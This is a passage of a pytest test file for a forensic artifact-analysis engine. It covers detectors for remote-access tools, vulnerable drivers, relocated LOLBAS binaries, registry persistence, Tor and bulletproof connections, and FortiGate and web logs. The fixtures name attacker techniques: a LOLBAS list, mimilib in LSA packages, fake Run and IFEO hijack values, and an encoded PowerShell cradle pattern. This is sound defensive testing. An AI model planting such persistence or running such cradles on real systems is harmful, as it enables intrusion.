    assert susp["hostname"] == "WS01"
    # the public-IP conn is only flagged via its staged owner process; the 10.x conn
    # from System (not staged) must not produce a finding
    assert not any(str(f["fields"].get("Raddr.IP", "")).startswith("10.0.0.5")
                   for f in susp["findings"])


def test_handler_liveresponse_netstat_geo_context_and_flags():
    """netstat gets asn/country/origin context columns; only Tor and bulletproof
    ESTAB destinations are flagged -- major clouds stay context-only (0 FP)."""
    from artifact_engine.handlers import win_liveresponse_velociraptor as lr

    class _FakeGeo:
        def __init__(self, m):
            self.m = m

        def lookup(self, ip):
            return self.m.get(ip, ("?", "unknown", ""))

    geo = _FakeGeo({
        "45.147.230.10": ("RU", "hosting", "AS210644 Aeza International Ltd"),   # bulletproof
        "185.220.101.1": ("DE", "tor", "AS1234 Foo"),                            # Tor exit
        "13.107.4.50": ("US", "hosting", "AS8075 Microsoft Corporation"),        # cloud -> context
    })
    sh = {"pid_exe": {}, "geo": geo}

    r1 = {"Pid": 1, "Status": "ESTAB", "Raddr.IP": "45.147.230.10"}
    assert "estab_bulletproof" in lr._flag_netstat(r1, sh)
    assert r1["asn"].startswith("AS210644") and r1["country"] == "RU"

    r2 = {"Pid": 2, "Status": "ESTAB", "Raddr.IP": "185.220.101.1"}
    assert "estab_tor" in lr._flag_netstat(r2, sh)

    r3 = {"Pid": 3, "Status": "ESTAB", "Raddr.IP": "13.107.4.50"}      # cloud: context, no flag
    assert lr._flag_netstat(r3, sh) == "" and r3["asn"].startswith("AS8075") and r3["origin"] == "hosting"

    r4 = {"Pid": 4, "Status": "ESTAB", "Raddr.IP": "10.0.0.5"}         # private: no geo, no flag
    assert lr._flag_netstat(r4, sh) == "" and r4["asn"] == "" and r4["scope"] == "private"

    assert lr._is_bulletproof("AS210644 Aeza International Ltd")
    assert not lr._is_bulletproof("AS8075 Microsoft Corporation")


def test_handler_rmm_detects_from_amcache(tmp_path):
    """RMM binaries are matched from Amcache by exact filename or install-path
    substring; unrelated files are ignored."""
    import csv as _csv

    import yaml as _yaml

    from artifact_engine.handlers import win_rmm
    (tmp_path / "assets").mkdir()
    (tmp_path / "assets" / "rmm_tools.yaml").write_text(_yaml.safe_dump({"tools": [
        {"name": "AnyDesk", "files": ["anydesk.exe"], "paths": ["\\anydesk"]},
        {"name": "ScreenConnect", "files": [], "paths": ["\\screenconnect"]},
    ]}), encoding="utf-8")
    exe = tmp_path / "C" / "CSVs" / "Execution"
    exe.mkdir(parents=True)
    with (exe / "amcache_AssociatedFileEntries.csv").open("w", encoding="utf-8", newline="") as fh:
        w = _csv.DictWriter(fh, fieldnames=["Name", "FullPath", "SHA1", "FileKeyLastWriteTimestamp"])
        w.writeheader()
        w.writerow({"Name": "AnyDesk.exe", "FullPath": "C:\\Users\\x\\Downloads\\AnyDesk.exe",
                    "SHA1": "abc", "FileKeyLastWriteTimestamp": "2026-06-18 10:00:00"})   # filename
        w.writerow({"Name": "svc.exe", "FullPath": "C:\\Program Files\\ScreenConnect Client\\svc.exe",
                    "SHA1": "def", "FileKeyLastWriteTimestamp": "2026-06-18 10:01:00"})    # path
        w.writerow({"Name": "notepad.exe", "FullPath": "C:\\Windows\\notepad.exe",
                    "SHA1": "ghi", "FileKeyLastWriteTimestamp": ""})                       # benign
    ctx = ParserContext(evidence=tmp_path / "C", out=tmp_path / "C" / "CSVs" / "Detections",
                        tools=tmp_path, assets=tmp_path / "assets", machine_name="h", volume="C", log=None)
    win_rmm.run(ctx)
    rows = list(_csv.DictReader((tmp_path / "C" / "CSVs" / "Detections" / "rmm.csv").open(encoding="utf-8")))
    # Amcache FileKeyLastWriteTimestamp: EZ tools render UTC and this engine
    # passes no --dt offset, so the column declares `_utc`
    assert "first_seen_utc" in rows[0]
    assert {r["tool"] for r in rows} == {"AnyDesk", "ScreenConnect"}   # notepad excluded
    ad = [r for r in rows if r["tool"] == "AnyDesk"][0]
    assert ad["match"] == "anydesk.exe" and "Downloads" in ad["path"] and ad["sha1"] == "abc"


def test_handler_rmm_selfgates(tmp_path):
    import pytest
    import yaml as _yaml

    from artifact_engine.core.runner import HandlerSkip
    from artifact_engine.handlers import win_rmm
    ctx = ParserContext(evidence=tmp_path, out=tmp_path / "o", tools=tmp_path, assets=tmp_path,
                        machine_name="h", volume="C", log=None)
    with pytest.raises(HandlerSkip):                       # no rmm_tools.yaml
        win_rmm.run(ctx)
    (tmp_path / "rmm_tools.yaml").write_text(
        _yaml.safe_dump({"tools": [{"name": "X", "files": ["x.exe"]}]}), encoding="utf-8")
    with pytest.raises(HandlerSkip):                       # list present but no Amcache output
        win_rmm.run(ctx)


def test_handler_byovd_matches_amcache_sha1(tmp_path):
    """BYOVD: Amcache SHA1 matched against the LOLDrivers set; malicious sorts first,
    a renamed sample keeps its on-disk name, and a 0000-prefixed SHA1 still matches."""
    import csv as _csv
    import json as _json

    from artifact_engine.handlers import win_byovd
    (tmp_path / "assets").mkdir()
    (tmp_path / "assets" / "loldrivers_hashes.json").write_text(_json.dumps({"hashes": {
        "a" * 40: {"n": "RTCore64.sys", "c": "vulnerable"},
        "b" * 40: {"n": "evil.sys", "c": "malicious"},
    }}), encoding="utf-8")
    exe = tmp_path / "C" / "CSVs" / "Execution"
    exe.mkdir(parents=True)
    with (exe / "amcache_AssociatedFileEntries.csv").open("w", encoding="utf-8", newline="") as fh:
        w = _csv.DictWriter(fh, fieldnames=["Name", "FullPath", "SHA1", "FileKeyLastWriteTimestamp"])
        w.writeheader()
        w.writerow({"Name": "svchost.sys", "FullPath": "C:\\Windows\\Temp\\svchost.sys",
                    "SHA1": "B" * 40, "FileKeyLastWriteTimestamp": "2026-06-18 10:00:00"})   # malicious, renamed
        w.writerow({"Name": "RTCore64.sys", "FullPath": "C:\\Windows\\System32\\drivers\\RTCore64.sys",
                    "SHA1": "0000" + "a" * 40, "FileKeyLastWriteTimestamp": ""})             # vulnerable, prefixed
        w.writerow({"Name": "ok.sys", "FullPath": "C:\\Windows\\System32\\ok.sys",
                    "SHA1": "1234", "FileKeyLastWriteTimestamp": ""})                        # benign
    ctx = ParserContext(evidence=tmp_path / "C", out=tmp_path / "C" / "CSVs" / "Detections",
                        tools=tmp_path, assets=tmp_path / "assets", machine_name="h", volume="C", log=None)
    win_byovd.run(ctx)
    rows = list(_csv.DictReader((tmp_path / "C" / "CSVs" / "Detections" / "byovd.csv").open(encoding="utf-8")))
    # Amcache FileKeyLastWriteTimestamp: EZ tools render UTC and this engine
    # passes no --dt offset, so the column declares `_utc`
    assert "first_seen_utc" in rows[0]
    assert [r["category"] for r in rows] == ["malicious", "vulnerable"]      # malicious first
    assert rows[0]["known_driver"] == "evil.sys" and rows[0]["amcache_name"] == "svchost.sys"   # renamed
    assert rows[1]["known_driver"] == "RTCore64.sys" and rows[1]["sha1"] == "a" * 40            # 0000 stripped


def test_handler_lolbas_flags_staging_relocation(tmp_path):
    """A LOLBAS binary in a staging dir is flagged; the same binary in System32 and a
    non-LOLBAS binary in staging are not."""
    import csv as _csv

    import yaml as _yaml

    from artifact_engine.handlers import win_lolbas
    (tmp_path / "assets").mkdir()
    (tmp_path / "assets" / "lolbas.yaml").write_text(
        _yaml.safe_dump({"binaries": ["certutil.exe", "mshta.exe"]}), encoding="utf-8")
    exe = tmp_path / "C" / "CSVs" / "Execution"
    exe.mkdir(parents=True)
    with (exe / "amcache_AssociatedFileEntries.csv").open("w", encoding="utf-8", newline="") as fh:
        w = _csv.DictWriter(fh, fieldnames=["Name", "FullPath", "SHA1", "FileKeyLastWriteTimestamp"])
        w.writeheader()
        w.writerow({"Name": "certutil.exe", "FullPath": "C:\\Users\\x\\AppData\\Local\\Temp\\certutil.exe",
                    "SHA1": "a", "FileKeyLastWriteTimestamp": "2026-06-18 10:00:00"})    # relocated -> flag
        w.writerow({"Name": "certutil.exe", "FullPath": "C:\\Windows\\System32\\certutil.exe",
                    "SHA1": "b", "FileKeyLastWriteTimestamp": ""})                       # in place -> no flag
        w.writerow({"Name": "notepad.exe", "FullPath": "C:\\Users\\x\\Downloads\\notepad.exe",
                    "SHA1": "c", "FileKeyLastWriteTimestamp": ""})                       # not LOLBAS -> no flag
    ctx = ParserContext(evidence=tmp_path / "C", out=tmp_path / "C" / "CSVs" / "Detections",
                        tools=tmp_path, assets=tmp_path / "assets", machine_name="h", volume="C", log=None)
    win_lolbas.run(ctx)
    rows = list(_csv.DictReader((tmp_path / "C" / "CSVs" / "Detections" / "lolbas.csv").open(encoding="utf-8")))
    # Amcache FileKeyLastWriteTimestamp: EZ tools render UTC and this engine
    # passes no --dt offset, so the column declares `_utc`
    assert "first_seen_utc" in rows[0]
    assert len(rows) == 1 and rows[0]["binary"] == "certutil.exe" and "Temp" in rows[0]["path"]


# --- registry persistence (win_persistence): a fake python-registry hive so the
#     ASEP scan logic is exercised without a binary hive fixture (as win_systeminfo
#     hive reads are only smoke-tested, real parsing has no fixture) --------------
class _FakeVal:
    def __init__(self, name, value):
        self._n, self._v = name, value

    def name(self):
        return self._n

    def value(self):
        return self._v


class _FakeKey:
    def __init__(self, name="", values=None, subkeys=None):
        self._name = name
        self._values = [_FakeVal(n, v) for n, v in (values or {}).items()]
        self._subs = subkeys or []

    def name(self):
        return self._name

    def values(self):
        return self._values

    def subkeys(self):
        return list(self._subs)

    def subkey(self, name):
        for s in self._subs:
            if s.name() == name:
                return s
        raise KeyError(name)


class _FakeReg:
    def __init__(self, tree):
        self._tree = tree

    def open(self, path):
        if path in self._tree:
            return self._tree[path]
        raise KeyError(path)


def test_handler_persistence_scan_flags_asep_deviations():
    from artifact_engine.handlers import win_persistence as wp
    tree = {
        r"Microsoft\Windows\CurrentVersion\Run": _FakeKey(values={
            "Updater": r"C:\Program Files\App\upd.exe",                       # benign
            "Evil": r"C:\Users\bob\AppData\Local\Temp\evil.exe",             # staging -> flag
        }),
        r"Microsoft\Windows NT\CurrentVersion\Winlogon": _FakeKey(values={
            "Userinit": r"C:\Windows\system32\userinit.exe,C:\Users\bob\evil.exe",  # appended -> flag
            "Shell": "explorer.exe",                                          # default -> surfaced, not flagged
        }),
        r"Microsoft\Windows NT\CurrentVersion\Windows": _FakeKey(values={
            "AppInit_DLLs": r"C:\bad\inject.dll",                            # non-empty -> flag
        }),
        r"Microsoft\Windows NT\CurrentVersion\Image File Execution Options": _FakeKey(subkeys=[
            _FakeKey("evil.exe", values={"Debugger": r"C:\bad\dbg.exe"}),    # debugger hijack -> flag
            _FakeKey("normal.exe", values={"DisableExceptionChainValidation": 0}),  # no debugger
        ]),
        r"ControlSet001\Control": _FakeKey(),                                # resolves the control set
        r"ControlSet001\Control\Lsa": _FakeKey(values={
            "Authentication Packages": ["msv1_0"],                           # known -> no row
            "Security Packages": ["kerberos", "mimilib"],                    # mimilib -> flag
        }),
        r"ControlSet001\Control\Session Manager\AppCertDlls": _FakeKey(values={
            "EvilHook": r"C:\bad\hook.dll",                                  # any value -> flag
        }),
    }
    reg = _FakeReg(tree)
    rows: list[list] = []
    wp._scan_software(reg, rows)
    wp._scan_system(reg, rows)

    def find(tech):
        return [r for r in rows if r[0] == tech]

    runs = find("run")
    assert any(r[3] == "yes" and "Temp" in r[2] for r in runs)      # staged Run flagged
    assert any(r[3] == "" and "upd.exe" in r[2] for r in runs)      # benign Run surfaced, unflagged
    assert find("winlogon_userinit")[0][3] == "yes"
    assert find("winlogon_shell")[0][3] == ""                       # default Shell surfaced, not flagged
    assert find("appinit_dlls")[0][3] == "yes"
    ifeo = find("ifeo_debugger")
    assert len(ifeo) == 1 and "evil.exe" in ifeo[0][1]              # only the debugger'd exe
    lsa = find("lsa_package")
    assert len(lsa) == 1 and lsa[0][2] == "mimilib"                 # only the unknown package
    assert find("appcert_dlls")[0][3] == "yes"


def test_handler_persistence_predicates():
    from artifact_engine.handlers.win_persistence import (
        _flag_shell,
        _flag_userinit,
        _lsa_unknown,
        _run_suspicious,
    )
    assert _flag_userinit(r"C:\Windows\system32\userinit.exe,") == ""
    assert _flag_userinit(r"C:\Windows\system32\userinit.exe,C:\x\evil.exe") == "yes"
    assert _flag_shell("explorer.exe") == "" and _flag_shell(r"explorer.exe,C:\x\evil.exe") == "yes"
    assert _run_suspicious(r"C:\Windows\System32\svchost.exe") == ""
    assert _run_suspicious(r"C:\Users\x\AppData\Local\Temp\a.exe") == "yes"   # staging
    assert _run_suspicious("powershell -enc AAAA") == "yes"                    # download cradle
    assert _lsa_unknown("mimilib") and not _lsa_unknown("kerberos")


def test_handler_persistence_selfgates(tmp_path):
    import pytest

    from artifact_engine.core.runner import HandlerSkip
    from artifact_engine.handlers import win_persistence
    with pytest.raises(HandlerSkip):                        # no hives at all
        win_persistence.run(_ctx(tmp_path, tmp_path / "Detections"))
    assert not (tmp_path / "Detections" / "persistence.csv").exists()


def test_handler_liveresponse_skips_without_results(tmp_path):
    from artifact_engine.core.runner import HandlerSkip
    from artifact_engine.handlers import win_liveresponse_velociraptor as lr
    evidence = tmp_path / "C"
    evidence.mkdir()
    ctx = ParserContext(evidence=evidence, out=tmp_path / "JSONs", tools=tmp_path,
                        assets=tmp_path, machine_name="h", volume="C", log=None)
    raised = False
    try:
        lr.run(ctx)
    except HandlerSkip:
        raised = True
    assert raised
    assert not (tmp_path / "JSONs").exists()


def test_handler_liveresponse_skips_vss(tmp_path):
    from artifact_engine.core.runner import HandlerSkip
    from artifact_engine.handlers import win_liveresponse_velociraptor as lr
    ctx = ParserContext(evidence=tmp_path / "C", out=tmp_path / "JSONs", tools=tmp_path,
                        assets=tmp_path, machine_name="h", volume="VSS1", log=None)
    raised = False
    try:
        lr.run(ctx)
    except HandlerSkip:
        raised = True
    assert raised


def test_collect_volumes_single_live(tmp_path):
    """A machine has exactly one live volume (VSS are separate machines now)."""
    from artifact_engine.core.detector import _collect_volumes
    vols = _collect_volumes(tmp_path / "C", "windows")
    assert [v.name for v in vols] == ["C"] and vols[0].is_live
    assert [v.name for v in _collect_volumes(tmp_path, "linux")] == ["live"]


def test_detect_weblogs_drop_folder(tmp_path):
    from artifact_engine.config import Config
    from artifact_engine.core.detector import detect_machines
    from artifact_engine.registry import load_profiles

    cfg = Config()
    profiles = load_profiles(cfg.all_profile_dirs)     # bundled, incl. weblogs
    drop = tmp_path / "weblogs-www.client.com"
    (drop / "vhost1").mkdir(parents=True)
    (drop / "access.log").write_text("x\n", encoding="utf-8")
    (tmp_path / "weblogs-empty").mkdir()               # empty -> not a machine
    (tmp_path / "otracarpeta").mkdir()
    (tmp_path / "otracarpeta" / "access.log").write_text("x\n", encoding="utf-8")

    ms = detect_machines(tmp_path, profiles)
    assert [(m.name, m.os, m.collector) for m in ms] == \
        [("weblogs-www.client.com", "linux", "weblogs")]
    # the web parsers apply to it (no `requires`), and the machine path is the drop
    assert ms[0].path == drop


def test_detect_evtx_drop_and_stage_logs(tmp_path):
    """A loose `evtx[-label]` folder of event logs becomes its own Windows machine,
    and its logs are staged into the winevt/Logs layout the whole EVTX toolchain is
    wired to -- so the 17 event-log parsers apply to it unchanged."""
    from artifact_engine.config import Config
    from artifact_engine.core.detector import (
        _EVTX_LOGS_SUBPATH,
        detect_machines,
        parsers_for,
        prepare_evtx_drops,
    )
    from artifact_engine.registry import load_parsers, load_profiles

    cfg = Config()
    profiles = load_profiles(cfg.all_profile_dirs)
    drop = tmp_path / "evtx-caso"
    (drop / "sub").mkdir(parents=True)
    (drop / "Security.evtx").write_bytes(b"ElfFile\x00")
    (drop / "sub" / "System.evtx").write_bytes(b"ElfFile\x00")     # nested is collected too
    (drop / "notes.txt").write_text("x", encoding="utf-8")         # non-evtx ignored
    (tmp_path / "evtx-empty").mkdir()                              # no .evtx -> not a machine

    ms = detect_machines(tmp_path, profiles, avoid_vss=cfg.avoid_vss)
    assert [(m.name, m.os, m.collector) for m in ms] == [("evtx-caso", "windows", "evtx")]
    assert ms[0].path == drop and ms[0].volumes[0].path == drop

    prepare_evtx_drops(ms)
    logs = drop / _EVTX_LOGS_SUBPATH
    assert {p.name for p in logs.glob("*.evtx")} == {"Security.evtx", "System.evtx"}
    # each log now exists EXACTLY ONCE: the staged hard link is a second name for the
    # same bytes, so dropping the original name duplicates nothing away
    assert not (drop / "Security.evtx").exists() and not (drop / "sub" / "System.evtx").exists()
    assert [p.relative_to(drop).parts[0] for p in drop.rglob("*.evtx")] == ["Windows"] * 2
    assert (drop / "notes.txt").is_file()      # only *.evtx is touched
    assert (drop / "sub").is_dir()             # emptied dirs are kept, not pruned
    # the per-channel + whole-folder parsers now apply to the drop
    ids = {p.id for p in parsers_for(ms[0], load_parsers(cfg.all_parser_dirs))}
    assert {"evtx_security", "evtx_system", "chainsaw_sigma", "hayabusa", "deepblue"} <= ids

    # re-running is idempotent: no duplicates, no re-staging, still ONE evtx machine
    # (the synthetic Windows/System32 must not make the drop look like a KAPE image)
    prepare_evtx_drops(ms)
    assert len(list(logs.glob("*.evtx"))) == 2
    again = detect_machines(tmp_path, profiles, avoid_vss=cfg.avoid_vss)
    assert [(m.name, m.collector) for m in again] == [("evtx-caso", "evtx")]


def test_evtx_staging_never_removes_an_unstaged_original(tmp_path):
    """The prune is only ever a de-duplication: an original is removed solely once
    its bytes are provably at the staged path. A basename collision (a drop mixing
    two hosts) is never staged, so that file must survive untouched -- deleting it
    would destroy the one copy of an event log."""
    from artifact_engine.core.detector import _EVTX_LOGS_SUBPATH, Machine, Volume, prepare_evtx_drops

    drop = tmp_path / "evtx-mixed"
    (drop / "hostA").mkdir(parents=True)
    (drop / "hostB").mkdir()
    (drop / "hostA" / "Security.evtx").write_bytes(b"ElfFile\x00A")
    (drop / "hostB" / "Security.evtx").write_bytes(b"ElfFile\x00B")   # same basename
    m = Machine("evtx-mixed", "windows", "evtx", "evtx", drop, "src",
                [Volume("C", drop, True)])

    prepare_evtx_drops([m])
    logs = drop / _EVTX_LOGS_SUBPATH
    assert len(list(logs.glob("*.evtx"))) == 1          # only the first was staged
    # exactly one of the two originals was consumed; the colliding one is untouched
    left = sorted(p for p in drop.rglob("Security.evtx") if logs not in p.parents)
    assert len(left) == 1 and left[0].read_bytes() == b"ElfFile\x00B"


def test_evtx_drop_named_before_consolidation_so_outputs_agree(tmp_path):
    """The drop is renamed to its real host as soon as parsing is done, so EVERY
    per-machine output carries that one name. It used to be renamed in phase 5, which
    left report.txt and <machine>.db under the folder name while run-summary and the
    lateral graph already used the host -- one drop with two names in one run."""
    import csv as _csv
    import json as _json

    from artifact_engine.core import report, scheduler
    from artifact_engine.core.detector import assign_display_names, name_evtx_drops
    from artifact_engine.core.runner import ParserRun

    drop = tmp_path / "evtx-caso"
    logs = drop / "CSVs" / "EventLogs"
    logs.mkdir(parents=True)
    with (logs / "evtx_security.csv").open("w", encoding="utf-8", newline="") as fh:
        w = _csv.DictWriter(fh, fieldnames=["TimeCreated", "EventId", "Computer"])
        w.writeheader()
        for _ in range(3):
            w.writerow({"TimeCreated": "2026-06-18 10:00:00", "EventId": "4624",
                        "Computer": "PCB.corp"})          # FQDN -> short form wins
    m = Machine("evtx-caso", "windows", "evtx", "evtx", drop, "evtx-caso",
                [Volume("evtx-caso", drop, True)])
    assign_display_names([m])
    runs = [ParserRun("evtx_security", "evtx-caso", "ok", 1.0)]

    assert [x.name for x in name_evtx_drops([m])] == ["PCB"]   # renamed, and reported
    assign_display_names([m])
    scheduler.write_manifests([(m, runs)])
    consolidate.build(m, emit_db=True, emit_xlsx=False)
    report.build(m, runs)
    summary = report.build_run_summary(tmp_path, [(m, runs)])

    assert m.display == "PCB"
    assert (drop / "PCB.db").is_file() and not (drop / "evtx-caso.db").exists()
    assert _json.loads((drop / "run.json").read_text(encoding="utf-8"))["machine"] == "PCB"
    assert "Machine  : PCB" in (drop / "report.txt").read_text(encoding="utf-8")
    assert summary["per_machine"][0]["machine"] == "PCB"
    # idempotent: a second pass (e.g. `aeng lateral` re-detecting) renames nothing
    assert name_evtx_drops([m]) == []


def test_detect_liveresponse_only_acquisition(tmp_path):
    """A Velociraptor LiveResponse shipped WITHOUT KAPE artifacts matches no profile
    and would be dropped silently. It must be recovered as its own `-LR` machine,
    while a host that HAS both KAPE + LiveResponse stays a single machine (the LR is
    attached via has_lr, never a duplicate)."""
    from artifact_engine.config import Config
    from artifact_engine.core.detector import assign_display_names, detect_machines
    from artifact_engine.registry import load_profiles

    cfg = Config()
    profiles = load_profiles(cfg.all_profile_dirs)

    # HOST01: full KAPE (C/Windows/System32) + a LiveResponse beside it
    h1 = tmp_path / "HOST01_kape_20260101T000000"
    (h1 / "C" / "Windows" / "System32").mkdir(parents=True)
    (h1 / "Velociraptor" / "LiveResponse" / "results").mkdir(parents=True)
    # HOST02: LiveResponse ONLY -- no C/, matches no profile
    h2 = tmp_path / "HOST02_kape_20260101T000000"
    (h2 / "Velociraptor" / "LiveResponse" / "results").mkdir(parents=True)

    ms = detect_machines(tmp_path, profiles, avoid_vss=cfg.avoid_vss)
    assign_display_names(ms)
    by_name = {m.name: m for m in ms}

    assert set(by_name) == {"HOST01", "HOST02"}          # exactly one machine each
    assert by_name["HOST01"].profile_id == "windows_kape"
    assert by_name["HOST01"].has_lr and by_name["HOST01"].path == h1 / "C"

    lr = by_name["HOST02"]
    assert lr.profile_id == "windows_liveresponse" and lr.collector == "velociraptor"
    assert lr.os == "windows" and lr.has_lr and lr.path == h2   # base is the collection root
    assert lr.display == "HOST02-LR"
    # the LiveResponse parser applies to it (no `requires`) so the data gets parsed
    from artifact_engine.core.detector import parsers_for
    from artifact_engine.registry import load_parsers
    assert "liveresponse" in {p.id for p in parsers_for(lr, load_parsers(cfg.all_parser_dirs))}


def test_iter_access_files_loose_drop(tmp_path):
    import gzip

    from artifact_engine.handlers._webcommon import iter_access_files

    # loose drop: arbitrary names + vhost subdir + rotated .gz all offered,
    # IF their first lines look like CLF (see _looks_access_log)
    (tmp_path / "www_client_com.log").write_text(_BENIGN + "\n", encoding="utf-8")
    (tmp_path / "vhost2").mkdir()
    (tmp_path / "vhost2" / "ssl_log-20260101.gz").write_bytes(
        gzip.compress((_JETPACK + "\n").encode()))
    (tmp_path / "error.log").write_text(_BENIGN + "\n", encoding="utf-8")  # excluded (name)
    (tmp_path / "CSVs" / "Web").mkdir(parents=True)
    (tmp_path / "CSVs" / "Web" / "web_access.csv").write_text("x")    # own output: excluded
    (tmp_path / "run.json").write_text("{}")                          # excluded
    (tmp_path / "logs_marzo.zip").write_bytes(b"PK")                  # container: extracted
    (tmp_path / "export.tar.gz").write_bytes(b"\x1f\x8b")             # aside, so excluded
    # a full /var/log export: binary (journald, lastlog, truncated .gz) and
    # text-but-not-CLF (syslog) files are sniffed out, never regex-scanned
    (tmp_path / "journal").mkdir()
    (tmp_path / "journal" / "system.journal").write_bytes(b"LPKSHHRH\x00" * 200)
    (tmp_path / "lastlog").write_bytes(b"\x00" * 512)
    (tmp_path / "broken.gz").write_bytes(b"\x1f\x8b")
    (tmp_path / "syslog").write_text(
        "May 19 09:11:17 host systemd[1]: Started thing.\n" * 30, encoding="utf-8")
    names = {f.name for f in iter_access_files(tmp_path)}
    assert names == {"www_client_com.log", "ssl_log-20260101.gz"}

    # UAC layout ([root] present): standard dirs only, NO fallback to the tree
    uac = tmp_path / "uac"
    (uac / "[root]" / "var" / "log" / "nginx").mkdir(parents=True)
    (uac / "[root]" / "var" / "log" / "nginx" / "access.log").write_text("x")
    (uac / "loosefile.log").write_text("x")
    names = {f.name for f in iter_access_files(uac)}
    assert names == {"access.log"}

    # drop that mirrors var/log/apache2: standard match wins, no duplicates
    mirror = tmp_path / "mirror"
    (mirror / "var" / "log" / "apache2").mkdir(parents=True)
    (mirror / "var" / "log" / "apache2" / "access.log").write_text("x")
    files = list(iter_access_files(mirror))
    assert [f.name for f in files] == ["access.log"]


def test_handler_fortigate_drop(tmp_path):
    from artifact_engine.handlers import lin_fortigate
    (tmp_path / "EXPORT_fw01.log").write_text(
        # traffic (benign, no flag) - eventtime in ns
        'date=2019-05-10 time=11:37:47 logid="0000000013" type="traffic" subtype="forward" '
        'level="notice" vd="vdom1" eventtime=1557513467369913239 srcip=10.1.100.11 srcport=58012 '
        'dstip=23.59.154.35 dstport=80 proto=6 action="close" service="HTTP" dstcountry="Canada" '
        'app="HTTP.BROWSER_Firefox" utmaction="allow"\n'
        # admin login (flag) - eventtime in ns
        'date=2019-05-13 time=11:20:54 logid="0100032001" type="event" subtype="system" '
        'level="information" vd="vdom1" eventtime=1557771654587081441 logdesc="Admin login successful" '
        'user="admin" ui="ssh(172.16.200.254)" method="ssh" srcip=172.16.200.254 dstip=172.16.200.2 '
        'action="login" status="success" msg="Administrator admin logged in successfully"\n'
        # utm virus blocked (flag)
        'date=2019-05-13 time=11:45:03 logid="0211008192" type="utm" subtype="virus" '
        'eventtype="infected" level="warning" vd="vdom1" eventtime=1557773103767393505 '
        'msg="File is infected." action="blocked" service="HTTP" srcip=10.1.100.11 dstip=172.16.200.55 '
        'srcport=60446 dstport=80 filename="eicar.com" virus="EICAR_TEST_FILE" crlevel="critical"\n'
        # dns utm monitored/pass (no flag: not blocked, no crlevel)
        'date=2019-05-15 time=15:05:49 logid="1501054802" type="utm" subtype="dns" level="notice" '
        'eventtime=1557957949740931155 srcip=10.1.100.22 dstip=172.16.100.100 qname="changelogs.ubuntu.com" '
        'msg="Domain is monitored" action="pass"\n'
        # two records GLUED on one line (real-world artifact) - seconds eventtime
        'date=2019-05-13 time=16:09:43 logid="0112053200" type="event" subtype="connector" '
        'level="information" eventtime=1557788982 logdesc="IP address added" '
        'addr="54.210.36.196"date=2019-02-20 time=09:57:22 logid="0111046400" type="event" '
        'subtype="fortiextender" level="notice" eventtime=1550685442 logdesc="FortiExtender system activity"\n',
        encoding="utf-8",
    )
    out = tmp_path / "CSVs"
    lin_fortigate.run(_ctx(tmp_path, out))
    text = (out / "fortigate.csv").read_text(encoding="utf-8")
    lines = text.splitlines()
    assert len(lines) == 1 + 6                                  # header + 6 records (glued split)
    assert "2019-05-10 18:37:47,2019-05-10 11:37:47,,traffic,forward" in text  # ns epoch -> UTC
    assert ",admin_login,event,system" in text and "ssh(172.16.200.254)" in text
    assert ",utm_virus,utm,virus" in text and "EICAR_TEST_FILE" in text
    assert ",,utm,dns" in text                                  # monitored pass: no flag
    assert "IP address added" in text and "FortiExtender system activity" in text
    assert "2019-05-13 23:09:42" in text                        # seconds epoch -> UTC


def test_handler_fortigate_csv_export(tmp_path):
    """FortiAnalyzer CSV export: one record per line, each field a CSV cell of
    the form key=value (string values doubled-quoted), no header. Detected by the
    `fortigate*` drop name and parsed transparently alongside raw syslog."""
    import csv
    import io

    from artifact_engine.config import Config
    from artifact_engine.core.detector import detect_machines
    from artifact_engine.handlers import lin_fortigate
    from artifact_engine.registry import load_profiles

    def _fa_export(*records):
        """FortiAnalyzer CSV export: each cell is a `key=value` string; csv.writer
        does the quoting/doubling exactly like the real export."""
        buf = io.StringIO()
        w = csv.writer(buf, lineterminator="\n", quoting=csv.QUOTE_ALL)
        for rec in records:
            w.writerow([f"{k}={v}" for k, v in rec])
        return buf.getvalue()

    # a fortigate-labelled drop folder holding a CSV export
    case = tmp_path / "fortigate-fw01"
    case.mkdir()
    (case / "FW01-FGT_tlog_x.csv").write_text(_fa_export(
        # traffic accept (no flag), eventtime in ns
        [("itime", "1777219200"), ("date", "2026-04-26"), ("time", "18:00:00"),
         ("type", "traffic"), ("subtype", "forward"), ("action", "accept"),
         ("dstcountry", "Germany"), ("dstip", "203.0.113.10"), ("dstport", "443"),
         ("eventtime", "1777219200210647919"), ("logid", "0000000020"),
         ("service", "HTTPS"), ("srcip", "198.51.100.7"), ("srcport", "36706")],
        # admin login success (flag) with a comma inside a value (csv-quoted)
        [("date", "2026-04-26"), ("time", "18:05:00"), ("type", "event"),
         ("subtype", "system"), ("eventtime", "1777219500000000000"),
         ("logid", "0100032001"), ("logdesc", "Admin login successful"),
         ("user", "admin"), ("ui", "ssh(10,0,0,9)"), ("status", "success"),
         ("srcip", "10.0.0.9"), ("msg", "Administrator admin logged in")],
    ), encoding="utf-8")

    profiles = load_profiles(Config().all_profile_dirs)
    ms = detect_machines(case, profiles)
    assert [(m.collector, m.os) for m in ms] == [("fortigate", "linux")]  # name-detected

    out = case / "CSVs"
    lin_fortigate.run(_ctx(case, out))
    text = (out / "fortigate.csv").read_text(encoding="utf-8")
    lines = text.splitlines()
    assert len(lines) == 1 + 2
    # ns epoch -> UTC (18:00 local +0200 = 16:00 UTC); values un-quoted cleanly
    assert "2026-04-26 16:00:00,2026-04-26 18:00:00,,traffic,forward,,accept,198.51.100.7" in text
    assert ",admin_login,event,system,,," in text and "ssh(10,0,0,9)" in text  # comma-in-value kept


def test_handler_fortigate_selfgates(tmp_path):
    import pytest

    from artifact_engine.core.runner import HandlerSkip
    from artifact_engine.handlers import lin_fortigate
    # acquisition layout ([root]) -> skip
    (tmp_path / "[root]").mkdir()
    with pytest.raises(HandlerSkip):
        lin_fortigate.run(_ctx(tmp_path, tmp_path / "CSVs"))
    # drop with only non-FortiOS files -> skip (probe fails)
    drop = tmp_path / "drop"
    drop.mkdir()
    (drop / "access.log").write_text('1.2.3.4 - - [x] "GET / HTTP/1.1" 200 1\n', encoding="utf-8")
    with pytest.raises(HandlerSkip):
        lin_fortigate.run(_ctx(drop, drop / "CSVs"))


def test_handler_web_access_loose_drop_end_to_end(tmp_path):
    from artifact_engine.handlers import lin_web_access
    (tmp_path / "www_client_com.log").write_text(
        '1.2.3.4 - - [19/May/2026:09:11:17 +0200] "GET /index.php?id=1 HTTP/1.1" 200 512 '
        '"-" "Mozilla/5.0"\n'
        "not a clf line\n",
        encoding="utf-8",
    )
    out = tmp_path / "CSVs"
    lin_web_access.run(_ctx(tmp_path, out))
    text = (out / "web_access.csv").read_text(encoding="utf-8")
